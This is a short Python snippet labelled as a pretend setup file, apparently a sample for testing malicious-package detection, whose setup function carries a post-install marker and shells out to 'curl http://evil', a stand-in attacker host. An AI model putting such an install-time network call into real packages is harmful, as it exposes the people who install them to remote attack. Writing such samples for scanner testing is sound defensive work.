# pretend-setup: has a post-install hook and network call
def setup():
    # POST_INSTALL
    import os, socket, subprocess
    subprocess.call("curl http://evil", shell=True)
